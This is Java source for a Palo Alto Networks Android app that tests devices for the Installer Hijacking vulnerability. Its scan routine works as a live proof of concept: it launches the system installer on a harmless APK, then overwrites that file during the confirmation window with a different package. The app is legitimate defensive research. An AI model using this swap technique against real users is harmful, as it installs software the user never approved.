package com.paloaltonetworks.ctd.ihscanner;


/**
 * @author Zhi Xu
 * Security Research Group, Palo Alto Networks
 * Email: zxu@paloaltonetworks.com
 * 
 * The Android Installer Hijacking vulnerability can be used by attackers to potentially distribute malware, 
 * compromise devices, and steal user data. This free applications from Palo Alto Networks detects if your device 
 * is vulnerable to this serious exploit, allowing you to take steps to protect your sensitive data. 
 * Learn more about the vulnerability here:  http://researchcenter.paloaltonetworks.com/
 * 
 * Copyright (c) 2014, Palo Alto Networks, Inc. All rights reserved. 
 * Palo Alto Networks, the Palo Alto Networks Logo, are trademarks of Palo Alto Networks, Inc. All specifications are subject to change without notice. 
 * Palo Alto Networks assumes no responsibility for any inaccuracies in this document or for any obligation to update information in this document. 
 * Palo Alto Networks reserves the right to change, modify, transfer, or otherwise revise this publication without notice.
 */

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	
	Button scanButton, checkButton, resetButton;
	TextView guideView, noteView; 
	String TAG = "IHScanner";
	int Status = 0; // the initial status 

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		scanButton = (Button)findViewById(R.id.buttonStart);
		resetButton = (Button)findViewById(R.id.buttonReset);
		checkButton = (Button)findViewById(R.id.buttonCheck);
		guideView = (TextView)findViewById(R.id.textViewResult);
		noteView = (TextView)findViewById(R.id.textViewNote);
		
		checkButton.setEnabled(false);
		
		final PackageManager pm = getPackageManager();
		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
		
		for(ApplicationInfo pkgInfo:packages){
			if(pkgInfo.packageName.equals("com.paloaltonetworks.ctd.malwareapp") || pkgInfo.packageName.equals("com.paloaltonetworks.ctd.benignapp")){
				scanButton.setEnabled(false);
				Toast.makeText(getApplicationContext(),"Press Reset button before starting the scan.", Toast.LENGTH_LONG).show();
				guideView.setText("Press Reset button to reset the scan.");
			}
		}
		
		Status = 0;
		
		noteView.setText("Copyright (c) 2015 Palo Alto Networks, Inc.");
		
		// Launch the checking process
		scanButton.setOnClickListener(new Button.OnClickListener(){

			@Override
			public void onClick(View v) {
				
				Intent intent = new Intent("android.intent.action.VIEW");
				
				// Move the benign apk file to sdcard
				
				AssetManager am = getAssets();
				String filename = "BenignApp.apk";
				InputStream in = null;
				OutputStream out = null;
				try{
					Log.d(TAG, "To copy benign app file "+filename+" to sdcard");
					in = am.open(filename);
					File dstFile = new File(getExternalFilesDir(null),filename);
					out = new FileOutputStream(dstFile);
					byte[] buffer = new byte[1024];
					int read;
					while((read = in.read(buffer))!=-1){
						out.write(buffer,0,read);
					}
					in.close();
					in = null;
					out.flush();
					out.close();
					out = null;
					Log.d(TAG,dstFile.getPath());
				}catch(IOException e){
					Log.e(TAG, "Failed to copy file "+filename+" to sdcard");
					guideView.setText("Press Reset button to restart the scan.");
				}

				try {
				    Thread.sleep(1000);
     				// Try to install this BenignApp.apk
        			intent.setDataAndType(Uri.fromFile(new File(getExternalFilesDir(null),"BenignApp.apk")),  "application/vnd.android.package-archive");
		    		intent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getApplicationContext().getPackageName());
			    	startActivity(intent);
				    Toast.makeText(getApplicationContext(),"launch the installer for good apk", Toast.LENGTH_SHORT).show();
				    Log.d(TAG, "Now the user sees the app information of BenignApp.apk");
				
    				// When the BenignApp.apk's app information is shown on the screen, overwrite the BenignApp.apk file by VulnerbilityExist.apk file

					Thread.sleep(600);
					
					am = getAssets();
					filename = "VulnerbilityExist.apk";

					in = null;
					out = null;
	
					Log.d(TAG, "Use VulnerbilityExist.apk to overwrite BenignApp.apk");
					String targetfilename = "BenignApp.apk";
					in = am.open(filename);
					File dstFile = new File(getExternalFilesDir(null),targetfilename);
					out = new FileOutputStream(dstFile);
					byte[] buffer = new byte[1024];
					int read;
					while((read = in.read(buffer))!=-1){
						out.write(buffer,0,read);
					}
					in.close();
					in = null;
					out.flush();
					out.close();
					out = null;
   					Log.d(TAG,dstFile.getPath());
					
					Log.d(TAG, "Replacement complete");
					Toast.makeText(getApplicationContext(),"Replacement complete!", Toast.LENGTH_SHORT).show();
				} catch (IOException e) {
					e.printStackTrace();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				
				Status = 1;
				checkButton.setEnabled(true);
				scanButton.setEnabled(false);
				guideView.setText("Press Check button to see the scan result.");
			}
			
		});
		
		resetButton.setOnClickListener(new Button.OnClickListener(){
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				try {
					
					final PackageManager pm = getPackageManager();
					List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
					
					Runtime.getRuntime().exec("rm " + getExternalFilesDir(null)+"/BenignApp.apk " );
					Toast.makeText(getApplicationContext(),"Uninstall the testing apk files if exist", Toast.LENGTH_SHORT).show();
					
					Intent intent = new Intent(Intent.ACTION_DELETE);
					intent.setData(Uri.parse("package:com.paloaltonetworks.ctd.malwareapp"));
					for(ApplicationInfo pkgInfo:packages){
						if(pkgInfo.packageName.equals("com.paloaltonetworks.ctd.malwareapp")){
							intent.setData(Uri.parse("package:com.paloaltonetworks.ctd.malwareapp"));
							startActivity(intent);
						}
					}
					intent = new Intent(Intent.ACTION_DELETE);
					intent.setData(Uri.parse("package:com.paloaltonetworks.ctd.benignapp"));
					for(ApplicationInfo pkgInfo:packages){
						if(pkgInfo.packageName.equals("com.paloaltonetworks.ctd.benignapp")){
							intent.setData(Uri.parse("package:com.paloaltonetworks.ctd.benignapp"));
							startActivity(intent);
						}
					}
					
					Log.d(TAG, "Reset complete!");
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				Status = 1;
				checkButton.setEnabled(false);
				scanButton.setEnabled(true);
				guideView.setText("Press Start button to restart the scan.");
			}			
		});
		
		checkButton.setOnClickListener(new Button.OnClickListener(){

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub

				final PackageManager pm = getPackageManager();
				List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
				boolean success = false;
					
				Intent intent = new Intent(Intent.ACTION_DELETE);
				intent.setData(Uri.parse("package:com.paloaltonetworks.ctd.malwareapp"));
				for(ApplicationInfo pkgInfo:packages){
					if(pkgInfo.packageName.equals("com.paloaltonetworks.ctd.malwareapp")){
						success = true;
						break;
					}
				}
				if(success == true){
					Log.d(TAG, "Vulnerability exist!");
					Toast.makeText(getApplicationContext(),"Be aware! This device contains the Installer Hijacking vulnerability.", Toast.LENGTH_LONG).show();
					guideView.setText(" Scan Result: Be aware!! This device contains the Installer Hijacking vulnerability.");
				}else{
					Log.d(TAG, "Vulnerability not exist!");
					Toast.makeText(getApplicationContext(),"Good news! This device does not contain the Installer Hijacking vulnerability.", Toast.LENGTH_LONG).show();
					guideView.setText(" Scan Result: Good news! This device does not contain the Installer Hijacking vulnerability.");
				}
			}
			
		});
	}


}